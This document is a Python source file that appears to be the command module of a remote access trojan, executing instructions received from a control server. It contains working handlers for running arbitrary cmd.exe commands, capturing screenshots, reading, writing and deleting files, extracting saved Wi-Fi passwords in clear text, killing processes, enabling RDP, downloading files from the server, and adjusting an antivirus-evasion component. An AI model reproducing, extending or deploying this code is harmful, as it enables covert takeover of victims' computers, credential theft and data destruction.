import subprocess
import platform
import psutil
import socket
import logging
import base64
import os
import shutil
import datetime
import ctypes
import winreg
from rat_config import Config
from monitoring.rdp_controller import RDPController
from encryption.manager import EncryptionManager
from network.communicator import ServerCommunicator

class CommandError(Exception):
    pass

class CommandHandler:
    @staticmethod
    def execute(command_type, params):
        if Config.DEBUG_MODE:
            logging.info(f"Executing command type: {command_type}, params: {params}")
        handlers = {
            'system_info': CommandHandler.handle_system_info,
            'system_command': CommandHandler.handle_system_command,
            'capture_screenshot': CommandHandler.handle_screenshot,
            'file_operation': CommandHandler.handle_file_operation,
            'process_management': CommandHandler.handle_process_management,
            'edit_hosts': CommandHandler.handle_edit_hosts,
            'open_url': CommandHandler.handle_open_url,
            'upload_file': CommandHandler.handle_upload_file,
            'end_task': CommandHandler.handle_end_task,
            'enable_rdp': CommandHandler.handle_enable_rdp,
            'disable_rdp': CommandHandler.handle_disable_rdp,
            'adjust_behavior': CommandHandler.handle_adjust_behavior,
            'get_wifi_passwords': CommandHandler.handle_wifi_passwords,
            'cleanup_rdp': CommandHandler.handle_cleanup_rdp
        }
        
        handler = handlers.get(command_type)
        if not handler:
            if Config.DEBUG_MODE:
                logging.error(f"Unknown command type: {command_type}")
            raise CommandError(f"Unknown command type: {command_type}")
        
        return handler(params)
    
    @staticmethod
    def handle_cleanup_rdp(params):
        try:
            rdp_controller = RDPController(EncryptionManager(Config.ENCRYPTION_KEY))
            result = rdp_controller.cleanup_rdp()
            if result["status"] == "success":
                logging.info("RDP cleanup completed successfully")
                return result
            else:
                logging.error(f"Failed to clean up RDP: {result['message']}")
                raise CommandError(f"Failed to clean up RDP: {result['message']}")
        except Exception as e:
            logging.error(f"Cleanup RDP error: {str(e)}")
            raise CommandError(f"Cleanup RDP error: {str(e)}")

    @staticmethod
    def handle_wifi_passwords(params: dict) -> dict:
        try:
            if platform.system().lower() != "windows":
                logging.info("Wi-Fi password extraction only supported on Windows")
                return {
                    "status": "error",
                    "message": "Wi-Fi password extraction only supported on Windows",
                    "wifi_profiles": []
                }
            result = subprocess.run(
                ["netsh", "wlan", "show", "profiles"],
                capture_output=True,
                text=True,
                timeout=30
            )
            if result.returncode != 0:
                logging.error(f"Failed to get Wi-Fi profiles: {result.stderr}")
                raise CommandError(f"Failed to get Wi-Fi profiles: {result.stderr}")
            profiles = []
            for line in result.stdout.splitlines():
                if "All User Profile" in line:
                    ssid = line.split(":")[1].strip()
                    profiles.append(ssid)
            wifi_data = []
            for ssid in profiles:
                result = subprocess.run(
                    ["netsh", "wlan", "show", "profile", f"name={ssid}", "key=clear"],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                if result.returncode != 0:
                    logging.warning(f"Failed to get details for SSID {ssid}: {result.stderr}")
                    continue
                password = None
                for line in result.stdout.splitlines():
                    if "Key Content" in line:
                        password = line.split(":")[1].strip()
                        break
                wifi_data.append({
                    "ssid": ssid,
                    "password": password if password else "No password found"
                })
            if not wifi_data:
                logging.info("No Wi-Fi profiles found")
                return {
                    "status": "success",
                    "message": "No Wi-Fi profiles found",
                    "wifi_profiles": []
                }
            if Config.DEBUG_MODE:
                logging.info(f"Extracted {len(wifi_data)} Wi-Fi profiles")
            return {
                "status": "success",
                "message": "Wi-Fi profiles extracted successfully",
                "wifi_profiles": wifi_data
            }
        except Exception as e:
            logging.error(f"Wi-Fi password extraction error: {str(e)}")
            raise CommandError(f"Wi-Fi password extraction error: {str(e)}")

    @staticmethod
    def handle_end_task(params):
        process_name = params.get('process_name')
        if not process_name:
            if Config.DEBUG_MODE:
                logging.error("No process name provided")
            raise CommandError("No process name provided")
        
        try:
            result = subprocess.run(
                ['taskkill', '/IM', process_name, '/F'],
                capture_output=True,
                text=True,
                timeout=30
            )
            if Config.DEBUG_MODE:
                logging.info(f"Task {process_name} terminated: {result.stdout}")
            return {
                'status': 'success',
                'message': f"Task {process_name} terminated",
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            if Config.DEBUG_MODE:
                logging.error(f"Taskkill timed out for {process_name}")
            raise CommandError(f"Taskkill timed out for {process_name}")
        except subprocess.CalledProcessError as e:
            if Config.DEBUG_MODE:
                logging.error(f"Failed to terminate task {process_name}: {e.stderr}")
            return {
                'status': 'failed',
                'message': f"Failed to terminate task {process_name}",
                'stdout': e.stdout,
                'stderr': e.stderr,
                'returncode': e.returncode
            }
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Error terminating task {process_name}: {str(e)}")
            raise CommandError(f"Error terminating task {process_name}: {str(e)}")

    @staticmethod
    def handle_adjust_behavior(params):
        try:
            behavior = params.get("behavior", {})
            if not behavior:
                if Config.DEBUG_MODE:
                    logging.error("No behavior settings provided")
                raise CommandError("No behavior settings provided")
            
            anti_av = AntiAV()
            current_behavior = anti_av.adjust_behavior({"name": "manual"})
            current_behavior.update(behavior)
            
            if Config.DEBUG_MODE:
                logging.info(f"Behavior adjusted by server: {current_behavior}")
            return {
                "status": "success",
                "message": "Behavior adjusted",
                "new_behavior": current_behavior
            }
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Adjust behavior error: {str(e)}")
            raise CommandError(f"Adjust behavior error: {str(e)}")

    @staticmethod
    def handle_system_command(params):
        command = params.get('command')
        if not command:
            if Config.DEBUG_MODE:
                logging.error("No command provided")
            raise CommandError("No command provided")
        
        COMMAND_MAPPING = {
            'shutdown': 'shutdown /s /t 0',
            'restart': 'shutdown /r /t 0',
            'sleep': 'rundll32.exe powrprof.dll,SetSuspendState 0,1,0',
            'signout': 'logoff',
            'startup': 'start notepad.exe'
        }
        
        sensitive_commands = ['shutdown', 'restart', 'sleep', 'signout']
        if command.lower() in sensitive_commands and not ctypes.windll.shell32.IsUserAnAdmin():
            if Config.DEBUG_MODE:
                logging.error(f"Command '{command}' requires admin privileges")
            raise CommandError(f"Command '{command}' requires admin privileges")
        
        actual_command = COMMAND_MAPPING.get(command.lower(), command)
        if Config.DEBUG_MODE:
            logging.info(f"Mapped command: {command} -> {actual_command}")
        
        try:
            if Config.DEBUG_MODE:
                logging.info(f"Executing system command: {actual_command}")
            shell_cmd = ['cmd.exe', '/c', actual_command]
            
            result = subprocess.run(
                shell_cmd,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            output = {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
            if Config.DEBUG_MODE:
                logging.info(f"System command executed: {actual_command}, returncode: {result.returncode}")
            return output
        except subprocess.TimeoutExpired:
            if Config.DEBUG_MODE:
                logging.error(f"Command timed out: {actual_command}")
            raise CommandError(f"Command timed out: {actual_command}")
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Failed to execute command: {actual_command}, error: {str(e)}")
            raise CommandError(f"Failed to execute command: {str(e)}")

    @staticmethod
    def handle_file_operation(params):
        action = params.get('action')
        path = params.get('path')
        if not action or not path:
            if Config.DEBUG_MODE:
                logging.error("Missing action or path")
            raise CommandError("Missing action or path")
        
        restricted_paths = ['/etc', '/var', '/root', 'C:\\Windows', 'C:\\Program Files', 'C:\\Program Files (x86)']
        for restricted in restricted_paths:
            if path.lower().startswith(restricted.lower()):
                if Config.DEBUG_MODE:
                    logging.error(f"Access to restricted path denied: {path}")
                raise CommandError(f"Access to restricted path denied: {path}")
        
        try:
            if action == 'list':
                if not os.path.exists(path):
                    if Config.DEBUG_MODE:
                        logging.error(f"Path does not exist: {path}")
                    raise CommandError(f"Path does not exist: {path}")
                
                result = []
                for entry in os.listdir(path):
                    full_path = os.path.join(path, entry)
                    stat = os.stat(full_path)
                    result.append({
                        'name': entry,
                        'type': 'directory' if os.path.isdir(full_path) else 'file',
                        'size': stat.st_size,
                        'modified': datetime.datetime.fromtimestamp(stat.st_mtime).isoformat()
                    })
                if Config.DEBUG_MODE:
                    logging.info(f"Directory listing for {path}: {len(result)} items")
                return {'files': result}
            
            elif action == 'recursive_list':
                if not os.path.exists(path):
                    if Config.DEBUG_MODE:
                        logging.error(f"Path does not exist: {path}")
                    raise CommandError(f"Path does not exist: {path}")
                
                result = []
                def scan_directory(current_path, depth=0):
                    try:
                        for entry in os.listdir(current_path):
                            full_path = os.path.join(current_path, entry)
                            try:
                                stat = os.stat(full_path)
                                result.append({
                                    'path': full_path,
                                    'name': entry,
                                    'type': 'directory' if os.path.isdir(full_path) else 'file',
                                    'size': stat.st_size,
                                    'modified': datetime.datetime.fromtimestamp(stat.st_mtime).isoformat(),
                                    'depth': depth
                                })
                                if os.path.isdir(full_path) and not os.path.islink(full_path):
                                    scan_directory(full_path, depth + 1)
                            except (PermissionError, OSError) as e:
                                result.append({
                                    'path': full_path,
                                    'name': entry,
                                    'type': 'error',
                                    'error': str(e),
                                    'depth': depth
                                })
                    except (PermissionError, OSError) as e:
                        result.append({
                            'path': current_path,
                            'name': os.path.basename(current_path),
                            'type': 'error',
                            'error': str(e),
                            'depth': depth
                        })
                
                scan_directory(path)
                temp_file = "recursive_list.txt"
                with open(temp_file, 'w', encoding='utf-8') as f:
                    for item in result:
                        indent = "  " * item['depth']
                        if item['type'] == 'error':
                            f.write(f"{indent}[ERROR] {item['path']}: {item['error']}\n")
                        else:
                            size = round(item['size'] / 1024, 2)
                            f.write(f"{indent}{item['type'][0].upper()}: {item['path']} ({size} KB, {item['modified']})\n")
                if Config.DEBUG_MODE:
                    logging.info(f"Recursive listing for {path} completed, saved to {temp_file}")
                return {'file_path': temp_file}
            
            elif action == 'read':
                if not os.path.isfile(path):
                    if Config.DEBUG_MODE:
                        logging.error(f"Not a file: {path}")
                    raise CommandError(f"Not a file: {path}")
                if os.path.getsize(path) > 1024 * 1024:
                    if Config.DEBUG_MODE:
                        logging.error(f"File too large: {path}")
                    raise CommandError(f"File too large: {path}")
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                if Config.DEBUG_MODE:
                    logging.info(f"File read successfully: {path}")
                return {'content': content, 'file_path': path}
            
            elif action == 'write':
                content = params.get('content')
                if not content:
                    if Config.DEBUG_MODE:
                        logging.error("Missing content for write operation")
                    raise CommandError("Missing content for write operation")
                with open(path, 'w', encoding='utf-8') as f:
                    f.write(content)
                if Config.DEBUG_MODE:
                    logging.info(f"File written successfully: {path}")
                return {'status': 'success', 'file_path': path}
            
            elif action == 'delete':
                if not os.path.exists(path):
                    if Config.DEBUG_MODE:
                        logging.error(f"Path does not exist: {path}")
                    raise CommandError(f"Path does not exist: {path}")
                if os.path.isdir(path):
                    shutil.rmtree(path, ignore_errors=True)
                else:
                    os.remove(path)
                if Config.DEBUG_MODE:
                    logging.info(f"Path deleted successfully: {path}")
                return {'status': 'success', 'file_path': path}
            
            else:
                if Config.DEBUG_MODE:
                    logging.error(f"Unsupported file operation: {action}")
                raise CommandError(f"Unsupported file operation: {action}")
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"File operation failed: {str(e)}")
            raise CommandError(f"File operation failed: {str(e)}")

    @staticmethod
    def handle_system_info(params):
        try:
            system_info = {
                'os': platform.system(),
                'os_version': platform.release(),
                'hostname': socket.gethostname(),
                'cpu_usage': psutil.cpu_percent(interval=1),
                'memory': psutil.virtual_memory()._asdict(),
                'disk': psutil.disk_usage('/')._asdict()
            }
            if Config.DEBUG_MODE:
                logging.info("System info collected successfully")
            return system_info
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Failed to collect system info: {str(e)}")
            raise CommandError(f"Failed to collect system info: {str(e)}")

    @staticmethod
    def handle_screenshot(params):
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            screenshot_path = "screenshot_temp.png"
            screenshot.save(screenshot_path)
            with open(screenshot_path, 'rb') as f:
                screenshot_data = f.read()
            os.remove(screenshot_path)
            if Config.DEBUG_MODE:
                logging.info("Screenshot captured successfully")
            return {'screenshot': base64.b64encode(screenshot_data).decode()}
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Failed to capture screenshot: {str(e)}")
            raise CommandError(f"Failed to capture screenshot: {str(e)}")

    @staticmethod
    def handle_process_management(params):
        action = params.get('action')
        if not action:
            if Config.DEBUG_MODE:
                logging.error("Missing action")
            raise CommandError("Missing action")
        
        try:
            if action == 'list':
                processes = [
                    {'pid': p.info['pid'], 'name': p.info['name'], 'cpu_percent': p.info['cpu_percent']}
                    for p in psutil.process_iter(['pid', 'name', 'cpu_percent'])
                ]
                return {'processes': processes}
            else:
                if Config.DEBUG_MODE:
                    logging.error(f"Unsupported process management action: {action}")
                raise CommandError(f"Unsupported process management action: {action}")
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Process management failed: {str(e)}")
            raise CommandError(f"Process management failed: {str(e)}")

    @staticmethod
    def handle_edit_hosts(params):
        action = params.get('action')
        if not action:
            if Config.DEBUG_MODE:
                logging.error("Missing action")
            raise CommandError("Missing action")
        
        try:
            hosts_path = 'C:\\Windows\\System32\\drivers\\etc\\hosts' if platform.system() == 'Windows' else '/etc/hosts'
            if action == 'list':
                with open(hosts_path, 'r') as f:
                    content = f.read()
                return {'content': content}
            else:
                if Config.DEBUG_MODE:
                    logging.error(f"Unsupported hosts action: {action}")
                raise CommandError(f"Unsupported hosts action: {action}")
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Edit hosts failed: {str(e)}")
            raise CommandError(f"Edit hosts failed: {str(e)}")

    @staticmethod
    def handle_open_url(params):
        url = params.get('url')
        if not url:
            if Config.DEBUG_MODE:
                logging.error("No URL provided")
            raise CommandError("No URL provided")
        
        try:
            import webbrowser
            webbrowser.open(url)
            if Config.DEBUG_MODE:
                logging.info(f"Opened URL: {url}")
            return {'status': 'success'}
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Failed to open URL: {str(e)}")
            raise CommandError(f"Failed to open URL: {str(e)}")

    @staticmethod
    def handle_upload_file(params):
        source = params.get('source')
        file_url = params.get('file_url')
        dest_path = params.get('dest_path')
        if not source or not file_url or not dest_path:
            if Config.DEBUG_MODE:
                logging.error("Missing source, file_url, or dest_path")
            raise CommandError("Missing source, file_url, or dest_path")
        
        try:
            if source == 'url':
                communicator = ServerCommunicator(Config.get_client_id(), EncryptionManager(Config.ENCRYPTION_KEY))
                response = communicator._send_request(
                    "action=download_file",
                    data={
                        "client_id": Config.get_client_id(),
                        "token": Config.SECRET_TOKEN,
                        "file_url": file_url
                    }
                )
                if response[0].get('status') != 'success':
                    if Config.DEBUG_MODE:
                        logging.error(f"Failed to download file from {file_url}: {response[0].get('message')}")
                    raise CommandError(f"Failed to download file: {response[0].get('message')}")
                with open(dest_path, 'wb') as f:
                    f.write(response[0].get('content'))
                if Config.DEBUG_MODE:
                    logging.info(f"File downloaded from {file_url} to {dest_path}")
                return {'status': 'success', 'path': dest_path}
            else:
                if Config.DEBUG_MODE:
                    logging.error(f"Unsupported upload source: {source}")
                raise CommandError(f"Unsupported upload source: {source}")
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"File upload failed: {str(e)}")
            raise CommandError(f"File upload failed: {str(e)}")

    @staticmethod
    def handle_enable_rdp(params):
        try:
            rdp_controller = RDPController(EncryptionManager(Config.ENCRYPTION_KEY))
            result = rdp_controller.enable_rdp()
            if result["status"] == "success":
                logging.info("RDP enabled and configured successfully")
                return result
            else:
                logging.error(f"Failed to enable RDP: {result['message']}")
                raise CommandError(f"Failed to enable RDP: {result['message']}")
        except Exception as e:
            logging.error(f"Enable RDP error: {str(e)}")
            raise CommandError(f"Enable RDP error: {str(e)}")

    @staticmethod
    def handle_disable_rdp(params):
        try:
            rdp_controller = RDPController(EncryptionManager(Config.ENCRYPTION_KEY))
            result = rdp_controller.disable_rdp()
            if result["status"] == "success":
                logging.info("RDP disabled successfully")
                return result
            else:
                logging.error(f"Failed to disable RDP: {result['message']}")
                raise CommandError(f"Failed to disable RDP: {result['message']}")
        except Exception as e:
            logging.error(f"Disable RDP error: {str(e)}")
            raise CommandError(f"Disable RDP error: {str(e)}")